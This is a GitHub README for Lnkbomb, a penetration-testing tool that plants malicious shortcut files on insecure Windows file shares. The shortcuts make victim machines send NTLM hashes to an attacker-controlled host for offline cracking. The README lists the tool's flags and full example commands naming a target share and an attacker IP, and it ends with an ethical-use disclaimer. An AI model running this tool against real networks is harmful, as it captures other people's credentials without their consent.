# Lnkbomb

[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/M4M03Q2JN)

Lnkbomb is used for uploading malicious shortcut files to insecure file shares.  The vulnerability exists due to Windows looking for an icon file to associate with the shortcut file.  This icon file can be directed to a penetration tester's machine running Responder or smbserver to gather NTLMv1 or NTLMv2 hashes (depending on configuration of the victim host machine).  The tester can then attempt to crack those collected hashes offline with a tool like Hashcat.

The payload file is uploaded directly to the insecure file specified by the tester in the command line. The tester includes their IP address as well, which is written into the payload.

## Usage
Installing Lnkbomb

```git clone https://github.com/dievus/lnkbomb.git```

Change directories to lnkbomb and run:

```python3 lnkbomb.py -h```

This will output the help menu, which contains the following flags:

```-h, --help - Lists the help options```

```-t, --target - Specifies the target file share (ex. -t \\192.168.1.1\Share)```

```-a, --attacker - Specifies the tester's attack machine (ex. -a 192.168.1.2)```

```-r, --recover - Used to remove the payload when testing is completed (ex. -r randomfilegenerated.recover)```

Examples of full commands include:

```python3 lnkbomb.py -t \\192.168.1.1\Share -a 192.168.1.2```

```python3 lnkbomb.py -r randomfilegenerated.recover```

### Notes
Please keep in mind that this tool is meant for ethical hacking and penetration testing purposes only. I do not condone any behavior that would include testing targets that you do not currently have permission to test against.  
